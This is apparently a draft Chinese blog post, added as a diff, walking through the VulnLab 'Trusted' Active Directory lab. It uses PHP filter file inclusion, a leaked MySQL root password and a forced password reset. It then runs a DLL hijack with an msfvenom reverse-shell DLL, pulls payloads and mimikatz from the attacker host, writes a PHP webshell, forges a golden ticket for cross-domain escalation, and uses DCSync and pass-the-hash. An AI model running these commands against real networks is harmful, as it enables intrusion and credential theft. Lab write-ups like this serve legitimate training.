@@ -1,0 +1,434 @@
+---
+title: "Labdc 10.10.163.38"
+date: "2026-04-08T23:21:43+08:00"
+publishDate: "2026-04-08T23:21:43+08:00"
+lastmod: "2026-04-08T23:21:43+08:00"
+draft: true
+unfinished: false
+---
+（https://dan-feliciano.com/2024/06/05/trusted/
+
+https://notes.secure77.de/?link=%2FWriteUps%2FVulnLab%2FTrusted%2FWriteup#
+
+）
+
+我们优先查看38这台机器上的80及443的http服务端口，我们经过查看，发现是同一个服务的两个端口服务
+
+phpadmin是403状态，但phpinfo页面我们可以查看
+
+我们优先针对web的路径进行相应的扫描工作
+
+```
+dirsearch -u http://10.10.163.38
+```
+
+![image-20250103152308914](https://s2.loli.net/2025/01/03/xwmFzCDNGbO2Wu4.png)
+
+同时下载一个phpinfo，进行相应的分析工作
+
+![image-20250103152418126](https://s2.loli.net/2025/01/03/RPNd52kFT78s4cS.png)
+
+![image-20250103152522150](https://s2.loli.net/2025/01/03/Nf2JUG7PWolcjdy.png)
+
+![image-20250103152600546](https://s2.loli.net/2025/01/03/p9JZfXubh2cAvzm.png)
+
+比较特别的就是allow_url_fopen是开启状态
+
+根据扫描，我们发现一个新的页面
+
+![image-20250103152835660](https://files.seeusercontent.com/2026/04/06/0Dgg/image-20250103152835660.png)
+
+```
+dirsearch -u http://10.10.163.38/dev -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
+```
+
+![image-20250103154359174](https://files.seeusercontent.com/2026/04/08/1Zwv/image-20250103154359174.png)
+
+开启扫描的同时，我们再相应页面上查找线索
+
+![image-20250103152936111](https://s2.loli.net/2025/01/03/dwUfh5DzHcXvNGM.png)
+
+![image-20250103152947778](https://s2.loli.net/2025/01/03/N2k53lTwBmL8ju1.png)
+
+![image-20250103153017660](https://s2.loli.net/2025/01/03/yBwrb3gpnGRFUNd.png)
+
+根据扫描结果，我们发现一个页面http://10.10.163.38/dev/DB.php
+
+![image-20250103153210877](https://s2.loli.net/2025/01/03/6oRf1UClkMOW7Ge.png)
+
+通过抓包没有什么额外发现，我们尝试是否能通过页面包含来读取这个php的源码
+
+```
+http://10.10.163.38/dev/index.html?view=php://filter/convert.base64-encode/resource=db.php
+```
+
+![image-20250103153618838](https://s2.loli.net/2025/01/03/3jiYBohQtcV1uyg.png)
+
+成功，我们将相应的内容在本地进行base64转换
+
+```
+echo -n "PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=" | base64 -d > db.php
+```
+
+![image-20250103153830895](https://s2.loli.net/2025/01/03/BcLYFM31IhkPzZd.png)
+
+我们成功获得了一堆数据库的账号密码
+
+username：root
+
+password：SuperSecureMySQLPassw0rd1337.
+
+我们又看到38这个服务器上开放了3306端口，我们进行访问尝试
+
+```
+mysql -u root -h 10.10.163.38 -p
+```
+
+![image-20250103154108418](https://files.seeusercontent.com/2026/04/08/9zJj/image-20250103154108418.png)
+
+```
+show databases;
+use news;
+show tables;
+select * from users;
+```
+
+![image-20250103154621000](https://files.seeusercontent.com/2026/04/06/ddQ2/image-20250103154621000.png)
+
+ id | first_name | short_handle | last_name | password                         |
++----+------------+--------------+-----------+----------------------------------+
+|  1 | Robert     | rsmith       | Smith     | 7e7abb54bbef42f0fbfa3007b368def7 |
+|  2 | Eric       | ewalters     | Walters   | d6e81aeb4df9325b502a02f11043e0ad |
+|  3 | Christine  | cpowers      | Powers    | e3d3eb0f46fe5d75eed8d11d54045a60 |
+
+
+
+username：rsmith
+
+password：IHateEric2
+
+![image-20250103154956513](https://files.seeusercontent.com/2026/04/08/xGe4/image-20250103154956513.png)
+
+我们考虑使用这组密码，验证下38服务器商的smb等服务，查看可用性
+
+```
+netexec smb 10.10.163.38 -u rsmith -p 'IHateEric2' --rid-brute
+netexec smb 10.10.163.38 -u rsmith -p 'IHateEric2' --shares
+```
+
+![image-20250103155343106](https://files.seeusercontent.com/2026/04/06/jD3x/image-20250103155343106.png)
+
+![image-20250103155349861](https://files.seeusercontent.com/2026/04/08/2Tbc/image-20250103155349861.png)
+
+我们将扫描的结果编制成一个users.txt
+
+![image-20250103155908106](https://files.seeusercontent.com/2026/04/08/np7G/image-20250103155908106.png)
+
+我们尝试使用psexec和3389端口的远程桌面均无法直接登录
+
+```
+impacket-GetNPUsers lab.trusted.vl/ -usersfile users.txt -dc-ip 10.10.163.38
+```
+
+![image-20250103161217532](https://s2.loli.net/2025/01/03/K27hwTQekaPHGVO.png)
+
+```
+rpcclient 10.10.163.38 -U rsmith
+#组信息
+enumdomgroups
+#查询某组人员
+querygroupmem 0x200
+#查询人员
+enumdomusers
+#尝试更换密码
+setuserinfo2 ewalters 23 Password@1
+```
+
+![image-20250103162037649](https://s2.loli.net/2025/01/03/irAQLwGYh2dSnov.png)
+
+![image-20250103162218979](https://s2.loli.net/2025/01/03/e7JpvAlW48sENwB.png)
+
+username:ewalters
+
+password:Password@1
+
+```
+netexec smb 10.10.163.38 -u ewalters -p 'Password@1' --shares
+```
+
+![image-20250103162315850](https://s2.loli.net/2025/01/03/zGoAg3FKSLJe9VC.png)
+
+但还是无法登录，我们看到cpowers是属于domain admin组的，应当可以远程登录
+
+我们使用bloodhound进行信息收集和分析
+
+```
+bloodhound-python -d 'lab.trusted.vl' -u 'rsmith' -p 'IHateEric2' -c all -ns 10.10.163.38
+```
+
+![image-20250103163950170](https://s2.loli.net/2025/01/03/veWScNKRHDt4grd.png)
+
+![image-20250103164131237](https://s2.loli.net/2025/01/03/GiKDbZCQ35mc4a2.png)
+
+![image-20250103164138893](https://s2.loli.net/2025/01/03/AHGOxzKXFirl6mI.png)
+
+![image-20250103164409493](https://s2.loli.net/2025/01/03/F93iAMoRKnGBePL.png)
+
+```
+netexec winrm 10.10.163.38 -u ewalters -p 'Password@1'
+```
+
+![image-20250103165114803](https://s2.loli.net/2025/01/03/PaZ1DNqsEfxVehd.png)
+
+```
+evil-winrm -i 10.10.163.38 -u ewalters -p 'Password@1'
+```
+
+![image-20250103170205130](https://files.seeusercontent.com/2026/04/08/9lpK/image-20250103170205130.png)
+
+我们下载图片，查看是否存在隐写，但下载一直失败
+
+我们在C盘下发现一个不常见的目录，Christine就是另外一个用户，且是域管理员用户，非常可能这个目录的exe就是由这个用户来执行
+
+![image-20250103172817120](https://files.seeusercontent.com/2026/04/06/za5C/image-20250103172817120.png)
+
+![image-20250103171056089](https://s2.loli.net/2025/01/03/B3E1982SIXraPiv.png)
+
+我们在kali启动一个共享服务来进行下载
+
+```
+sudo impacket-smbserver smb share/ -smb2support
+copy KasperskyRemovalTool.exe \\10.8.4.161\smb\KasperskyRemovalTool.exe
+```
+
+![image-20250103171529245](https://s2.loli.net/2025/01/03/jHIStMu8wFJ5ZGl.png)
+
+我们运行下，查看是否会链接一些dll应用，我们使用process monitor
+
+![image-20250103172014415](https://s2.loli.net/2025/01/03/wvXizZK38u7CJ5U.png)
+
+![image-20250103172206212](https://s2.loli.net/2025/01/03/RoApJdeM8wI1jCY.png)
+
+![image-20250103172215535](https://s2.loli.net/2025/01/03/owbXvBWiqae2UQO.png)
+
+我们会发现这个exe启动，会引用当前目录非常多的dll文件，那么我们就可以执行dll Hijacking
+
+我们创建一个dll，进行上传，因为是32位应用，我们需要创建32位的dll
+
+![image-20250103174104344](https://files.seeusercontent.com/2026/04/08/Llk5/image-20250103174104344.png)
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.161 LPORT=443 -f dll > KasperskyRemovalToolENU.dll
+iwr http://10.8.4.161/KasperskyRemovalToolENU.dll -outfile KasperskyRemovalToolENU.dll
+iwr http://10.8.4.161/USP10.dll -outfile USP10.dll
+iwr http://10.8.4.161/KasperskyRemovalToolENU.dll -outfile KasperskyRemovalToolENU.dll(尝试多个DLL，只有这个成功，且中文环境中后缀会变成CHS，也是执行不成功)
+```
+
+![image-20250103172625946](https://s2.loli.net/2025/01/03/6H47Jt5ARgnIOvC.png)
+
+我们等待下，看看是否会有用户来进行执行，等待了一会就有一个shell返回
+
+![image-20250103175932791](https://s2.loli.net/2025/01/03/dEYSIiknlg9OBcq.png)
+
+cpowers是域管理员组
+
+![image-20250103180017117](https://s2.loli.net/2025/01/03/Kx2emSJV6vYgpnB.png)
+
+我们实际已经获得了最高权限，我们在administrator目录下获取到对应的flag内容
+
+![image-20250103180130005](https://s2.loli.net/2025/01/03/5bELXJSB96A2PRN.png)
+
+我们持久化一下目前的shell，并上传mimikatz，查看这台机器是否还有其他可以获取的内容
+
+```
+sudo stty raw -echo; (stty size; cat) | nc -lvnp 3001
+.\ConPtyShell.exe 10.8.4.161 3001
+stty raw -echo; fg
+reset
+```
+
+实际这里我们还有一种方法因为phpinfo中获取了危险配置
+
+![image-20250103222846379](https://s2.loli.net/2025/01/03/gXAeOz5JvuFCETU.png)
+
+**`open_basedir`**:（没有值）
+
+- 这是一项安全配置，用于限制 PHP 脚本只能访问指定目录下的文件。如果这个选项配置了一个严格的文件访问权限，则可能限制通过数据库向某些目录导出文件的能力
+
+![image-20250103222917891](https://s2.loli.net/2025/01/03/FDoJkUVSYmy24Rc.png)
+
+1. **`file_uploads`**:
+   - 这个选项通常用来控制通过 HTTP 上传文件的功能，但它的启用或禁用不会直接影响从数据库中导出文件的能力。
+
+我们的sql权限又是root权限，所以我们可以通过数据库来进行一句话木马注入
+
+```
+select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4 into OUTFILE 'C:/xampp/htdocs/dev/shell.php'
+```
+
+
+
+
+
+我们下载一个mimikatz
+
+```
+iwr http://10.8.4.161/mimikatz.exe -outfile mimikatz.exe
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::lsa /patch
+```
+
+![image-20250103182117022](https://s2.loli.net/2025/01/03/9L6aeUQ2sMdXvqo.png)
+
+username:Administrator
+
+hashes:75878369ad33f35b7070ca854100bc07
+
+![image-20250103182227821](https://s2.loli.net/2025/01/03/EFJCma6npA9u7gX.png)
+
+可以使用的hash
+
+username:TRUSTED$
+
+hashes:7f57abdb6a646a3ac95c663f8dce3a8c
+
+User : krbtgt
+NTLM : c7a03c565c68c6fac5f8913fab576ebd
+
+我们目前需要考虑的是从子域跨到父域
+
+```
+lsadump::trust /patch
+```
+
+![image-20250103211347467](https://s2.loli.net/2025/01/03/kH7BInT2WleJpvQ.png)
+
+需求前域的SID、父域的SID、子域域管的NTLM信任密钥
+
+```
+TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591)
+LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)
+```
+
+```
+kerberos::golden /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /rc4:75878369ad33f35b7070ca854100bc07 /user:administrator /service:krbtgt /target:TRUSTED.VL /ticket:administrator.kirbi
+```
+
+![image-20250103211749678](https://s2.loli.net/2025/01/03/Zf4BIrMJpH2DaFv.png)
+
+```
+kerberos::ptt administrator.kirbi
+kerberos::list
+```
+
+![image-20250103212603588](https://s2.loli.net/2025/01/03/Geopnq39mTDbhRy.png)
+
+https://github.com/Lucifer1993/PLtools
+
+https://github.com/NotScortator/asktgs_compiled
+
+```
+/home/zkpc/Tools/Kekeo/asktgs_compiled
+iwr http://10.8.4.161/asktgs.exe -outfile asktgs.exe
+iwr http://10.8.4.161/kirbikator.exe -outfile kirbikator.exe
+```
+
+```
+.\asktgs.exe administrator.kirbi cifs/TRUSTED.VL
+.\asktgs.exe administrator.kirbi host/TRUSTED.VL
+```
+
+![image-20250103213825106](https://s2.loli.net/2025/01/03/KlXeN7vPkxYSTAn.png)
+
+![image-20250103213839444](https://s2.loli.net/2025/01/03/lZzeN5IcvLX2QOf.png)
+
+```
+.\kirbikator.exe lsa administrator.kirbi
+kerberos::list /export
+```
+
+![image-20250103214029602](https://s2.loli.net/2025/01/03/Vc3j8LgUe24ZbpY.png)
+
+```
+kerberos::ptt 0-40a00000-administrator@krbtgt~TRUSTED.VL-LAB.TRUSTED.VL.kirbi
+```
+
+![image-20250103214423070](https://s2.loli.net/2025/01/03/ouN3Erp6jiSTKwF.png)
+
+```
+cp /mnt/d/Tools/SysinternalsSuite/PsExec64.exe .
+.\PsExec64.exe \\trusteddc cmd.exe
+```
+
+但这种方法到这里不可行，我们尝试更换一种方法
+
+```
+kerberos::golden /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /user:administrator /ptt
+```
+
+![image-20250103215150944](https://s2.loli.net/2025/01/03/s9t81UCO24oaPmM.png)
+
+```
+#访问对应主机名
+dir \\trusteddc\c$
+```
+
+![image-20250103215243970](https://s2.loli.net/2025/01/03/OChj8pYoSA6PtuV.png)
+
+```
+使用mimikatz导出根域的hash
+lsadump::dcsync /domain:trusted.vl /all /csv
+```
+
+![image-20250103215342096](https://s2.loli.net/2025/01/03/w5MXdIYsUO9vl34.png)
+
+```
+502     krbtgt  d9436aebee2db5c6e4166d5e2472fa2d        514
+500     Administrator   15db914be1e6a896e7692f608a9d72ef        66048
+1000    TRUSTEDDC$      4af3bf9e0710f0a49b684cc1fb326131        532480
+1103    LAB$    5b863fcabd699a7da23e05bff68b8a68        2080
+```
+
+```
+evil-winrm -i 10.10.163.37 -u Administrator -H '15db914be1e6a896e7692f608a9d72ef'
+```
+
+![image-20250103215442947](https://s2.loli.net/2025/01/03/VZNqKH4lemh2XD8.png)
+
+我们成功获取对应的账号权限
+
+![image-20250103220720471](https://s2.loli.net/2025/01/03/t1ZroGXTH8hzY74.png)
+
+但无法读取文件，经过搜索我们发现这种情况，可能是被加密了
+
+```
+powershell命令
+[System.IO.File]::GetAttributes("C:\Users\Administrator\Desktop\root.txt").ToString().Contains("Encrypted")
+工具方法
+cipher.exe /u /n
+```
+
+![image-20250103221108576](https://s2.loli.net/2025/01/03/ZAMvOGfKwVr2FID.png)
+
+我们可以通过runascs的shell，登录位administrator，从而来绕过加密限制
+
+```
+mkdir C:\Temp
+iwr http://10.8.4.161/RunasCs.exe -outfile RunasCs.exe
+net user administrator "Password@1"
+.\RunasCs.exe administrator Password@1 -r 10.8.4.161:4446 cmd 
+```
+
+![image-20250103221542250](https://s2.loli.net/2025/01/03/XScYLAo8EZa7QG2.png)
+
+我们成功获取了flag内容
+
+跨域攻击
+
+https://www.cnblogs.com/candada/p/17501428.html
+
+https://www.anquanke.com/post/id/245941
+
+
